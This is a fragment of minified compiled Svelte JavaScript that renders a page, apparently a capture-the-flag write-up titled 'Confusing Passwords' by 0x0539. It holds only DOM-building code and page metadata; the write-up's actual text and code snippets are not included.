aa=on(C);Hn=ln(aa,!1),aa.forEach(s),Pn=l(n),T=p(n,"P",{"data-svelte-h":!0}),c(T)!=="svelte-1d2w13s"&&(T.innerHTML=Ts),Mn=l(n),H=p(n,"H2",{"data-svelte-h":!0}),c(H)!=="svelte-bti57c"&&(H.textContent=Hs),$n=l(n),P=p(n,"P",{"data-svelte-h":!0}),c(P)!=="svelte-1gf18vg"&&(P.textContent=Ps),qn=l(n),M=p(n,"OL",{"data-svelte-h":!0}),c(M)!=="svelte-9wkjp2"&&(M.innerHTML=Ms),Sn=l(n),$=p(n,"H3",{"data-svelte-h":!0}),c($)!=="svelte-849ef8"&&($.innerHTML=$s),Un=l(n),q=p(n,"P",{"data-svelte-h":!0}),c(q)!=="svelte-ib5ih3"&&(q.innerHTML=qs),En=l(n),S=p(n,"P",{"data-svelte-h":!0}),c(S)!=="svelte-b6h9pl"&&(S.innerHTML=Ss),An=l(n),U=p(n,"P",{"data-svelte-h":!0}),c(U)!=="svelte-1tacvg0"&&(U.innerHTML=Us),On=l(n),E=p(n,"P",{"data-svelte-h":!0}),c(E)!=="svelte-j4p8zs"&&(E.innerHTML=Es),jn=l(n),A=p(n,"H3",{"data-svelte-h":!0}),c(A)!=="svelte-124ctwh"&&(A.innerHTML=As),In=l(n),O=p(n,"P",{"data-svelte-h":!0}),c(O)!=="svelte-hevrlr"&&(O.innerHTML=Os),Nn=l(n),j=p(n,"PRE",{class:!0});var ta=on(j);Rn=ln(ta,!1),ta.forEach(s),Wn=l(n),I=p(n,"P",{"data-svelte-h":!0}),c(I)!=="svelte-1407lsf"&&(I.innerHTML=js),zn=l(n),N=p(n,"P",{"data-svelte-h":!0}),c(N)!=="svelte-14oepee"&&(N.innerHTML=Is),Fn=l(n),R=p(n,"P",{"data-svelte-h":!0}),c(R)!=="svelte-1lpvrtq"&&(R.innerHTML=Ns),Dn=l(n),W=p(n,"P",{"data-svelte-h":!0}),c(W)!=="svelte-11uxrhg"&&(W.textContent=Rs),Bn=l(n),z=p(n,"H3",{"data-svelte-h":!0}),c(z)!=="svelte-l5ynux"&&(z.innerHTML=Ws),Gn=l(n),F=p(n,"P",{"data-svelte-h":!0}),c(F)!=="svelte-1qwvv2n"&&(F.innerHTML=zs),Kn=l(n),D=p(n,"H3",{"data-svelte-h":!0}),c(D)!=="svelte-ylopn7"&&(D.textContent=Fs),Qn=l(n),B=p(n,"P",{"data-svelte-h":!0}),c(B)!=="svelte-1q1l18c"&&(B.innerHTML=Ds),Yn=l(n),G=p(n,"BLOCKQUOTE",{"data-svelte-h":!0}),c(G)!=="svelte-5wx5oi"&&(G.innerHTML=Bs),Zn=l(n),K=p(n,"P",{"data-svelte-h":!0}),c(K)!=="svelte-6ye48"&&(K.textContent=Gs),Jn=l(n),Q=p(n,"P",{"data-svelte-h":!0}),c(Q)!=="svelte-ulb9dv"&&(Q.innerHTML=Ks),Vn=l(n),Y=p(n,"UL",{"data-svelte-h":!0}),c(Y)!=="svelte-lt240p"&&(Y.innerHTML=Qs),Xn=l(n),Z=p(n,"P",{"data-svelte-h":!0}),c(Z)!=="svelte-kkyrbr"&&(Z.innerHTML=Ys),ns=l(n),J=p(n,"P",{"data-svelte-h":!0}),c(J)!=="svelte-vubm6b"&&(J.innerHTML=Zs),ss=l(n),V=p(n,"P",{"data-svelte-h":!0}),c(V)!=="svelte-1dc2q0z"&&(V.innerHTML=Js),as=l(n),X=p(n,"P",{"data-svelte-h":!0}),c(X)!=="svelte-1r8qb35"&&(X.innerHTML=Vs),ts=l(n),nn=p(n,"OL",{"data-svelte-h":!0}),c(nn)!=="svelte-12c3dj9"&&(nn.innerHTML=Xs),es=l(n),sn=p(n,"PRE",{class:!0});var ea=on(sn);ps=ln(ea,!1),ea.forEach(s),os=l(n),an=p(n,"H2",{"data-svelte-h":!0}),c(an)!=="svelte-110tevo"&&(an.textContent=na),ls=l(n),tn=p(n,"P",{"data-svelte-h":!0}),c(tn)!=="svelte-13av93y"&&(tn.innerHTML=sa),cs=l(n),en=p(n,"PRE",{class:!0});var pa=on(en);is=ln(pa,!1),pa.forEach(s),this.h()},h(){hn.a=null,cn(m,"class","language-php"),Hn.a=null,cn(C,"class","language-php"),Rn.a=null,cn(j,"class","language-php"),ps.a=null,cn(sn,"class","language-python"),is.a=null,cn(en,"class","language-lua")},m(n,a){t(n,i,a),t(n,rn,a),t(n,r,a),t(n,un,a),t(n,u,a),t(n,kn,a),t(n,k,a),t(n,dn,a),t(n,d,a),t(n,mn,a),t(n,m,a),hn.m(la,m),t(n,fn,a),t(n,h,a),t(n,vn,a),t(n,f,a),t(n,gn,a),t(n,v,a),t(n,wn,a),t(n,g,a),t(n,bn,a),t(n,w,a),t(n,yn,a),t(n,b,a),t(n,_n,a),t(n,y,a),t(n,Ln,a),t(n,_,a),t(n,xn,a),t(n,L,a),t(n,Cn,a),t(n,x,a),t(n,Tn,a),t(n,C,a),Hn.m(ca,C),t(n,Pn,a),t(n,T,a),t(n,Mn,a),t(n,H,a),t(n,$n,a),t(n,P,a),t(n,qn,a),t(n,M,a),t(n,Sn,a),t(n,$,a),t(n,Un,a),t(n,q,a),t(n,En,a),t(n,S,a),t(n,An,a),t(n,U,a),t(n,On,a),t(n,E,a),t(n,jn,a),t(n,A,a),t(n,In,a),t(n,O,a),t(n,Nn,a),t(n,j,a),Rn.m(ia,j),t(n,Wn,a),t(n,I,a),t(n,zn,a),t(n,N,a),t(n,Fn,a),t(n,R,a),t(n,Dn,a),t(n,W,a),t(n,Bn,a),t(n,z,a),t(n,Gn,a),t(n,F,a),t(n,Kn,a),t(n,D,a),t(n,Qn,a),t(n,B,a),t(n,Yn,a),t(n,G,a),t(n,Zn,a),t(n,K,a),t(n,Jn,a),t(n,Q,a),t(n,Vn,a),t(n,Y,a),t(n,Xn,a),t(n,Z,a),t(n,ns,a),t(n,J,a),t(n,ss,a),t(n,V,a),t(n,as,a),t(n,X,a),t(n,ts,a),t(n,nn,a),t(n,es,a),t(n,sn,a),ps.m(ra,sn),t(n,os,a),t(n,an,a),t(n,ls,a),t(n,tn,a),t(n,cs,a),t(n,en,a),is.m(ua,en)},p:rs,i:rs,o:rs,d(n){n&&(s(i),s(rn),s(r),s(un),s(u),s(kn),s(k),s(dn),s(d),s(mn),s(m),s(fn),s(h),s(vn),s(f),s(gn),s(v),s(wn),s(g),s(bn),s(w),s(yn),s(b),s(_n),s(y),s(Ln),s(_),s(xn),s(L),s(Cn),s(x),s(Tn),s(C),s(Pn),s(T),s(Mn),s(H),s($n),s(P),s(qn),s(M),s(Sn),s($),s(Un),s(q),s(En),s(S),s(An),s(U),s(On),s(E),s(jn),s(A),s(In),s(O),s(Nn),s(j),s(Wn),s(I),s(zn),s(N),s(Fn),s(R),s(Dn),s(W),s(Bn),s(z),s(Gn),s(F),s(Kn),s(D),s(Qn),s(B),s(Yn),s(G),s(Zn),s(K),s(Jn),s(Q),s(Vn),s(Y),s(Xn),s(Z),s(ns),s(J),s(ss),s(V),s(as),s(X),s(ts),s(nn),s(es),s(sn),s(os),s(an),s(ls),s(tn),s(cs),s(en))}}}const ga={title:"Confusing Passwords",description:"This login system will give you the flag... as long as you can prove you're an admin!",author:"0x0539",date:"2023-06-16",published:!0};class wa extends da{constructor(i){super(),ma(this,i,null,ha,ka,{})}}export{wa as default,ga as metadata};
